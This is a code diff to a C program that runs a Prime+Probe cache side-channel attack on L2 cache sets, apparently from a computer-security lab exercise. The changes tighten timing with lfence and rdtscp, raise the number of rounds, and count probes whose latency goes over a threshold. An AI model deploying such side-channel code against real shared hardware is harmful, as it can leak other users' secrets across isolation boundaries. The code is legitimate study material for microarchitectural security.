@@ -60,25 +60,30 @@ void eviction_set_construction(int logical_set_id) {
 
 // Prime the cache by following the linked list for the given set ID
 void prime_cache(int set_id) {
-    for(int i = 0; i < L2_ASSOCIATIVITY; i++) {
-        volatile struct linked_list_node *current = set_chains[set_id];
-        while (current) {
-            current = current->next;
-        }
+    volatile struct linked_list_node *current = set_chains[set_id];
+    while (current) {
+        current = current->next;
     }
 }
 
 // Probe the cache by measuring the time taken to follow the linked list for the given set ID
 uint64_t probe_cache(int set_id) {
-    uint64_t start_time = rdtscp();
     volatile struct linked_list_node *current = set_chains[set_id];
+    
+    asm volatile("lfence");
+    uint64_t start_time = rdtscp();
+    asm volatile("lfence");
+
     while (current) {
         current = current->next;
     }
-    return rdtscp() - start_time; // return the latency of probing the cache
-}
 
-// 
+    asm volatile("lfence");
+    uint64_t end_time = rdtscp();
+    asm volatile("lfence");
+
+    return end_time - start_time;
+}
 
 int main(int argc, char const *argv[]) {
     srand(time(NULL));
@@ -104,7 +109,7 @@ int main(int argc, char const *argv[]) {
     }
 
     memset(work_area, 0, PAGE_SIZE); // Initialize the work area with zeros
-    uint64_t record[L2_SETS];
+    uint64_t record[L2_SETS] = {0};
     memset(record, 0, sizeof(record)); // Record the number of hits for each set
 
     // Eviction set constructed for L2 cache sets
@@ -114,17 +119,17 @@ int main(int argc, char const *argv[]) {
 
     
     uint64_t threshold = 295; // From Part 01 Timing Graph 
-    int rounds = 3000; // High statistical rate to go above noise of measurements
+    int rounds = 30000; // High statistical rate to go above noise of measurements
 
     for(int r = 0; r < rounds; r++) {
         for(int s = 0; s < L2_SETS; s++) {
             prime_cache(s);
             // Waiting for Victim to access the cache line
-            for(volatile int wait= 0; wait < 100; wait++);
-            asm volatile("lfence");
+            for(volatile int wait= 0; wait < 200; wait++);
             uint64_t latency = probe_cache(s);
-            asm volatile("lfence");
-            record[s] += latency;
+            if(latency > threshold) {
+                record[s]++;
+            }
         }
     }
 
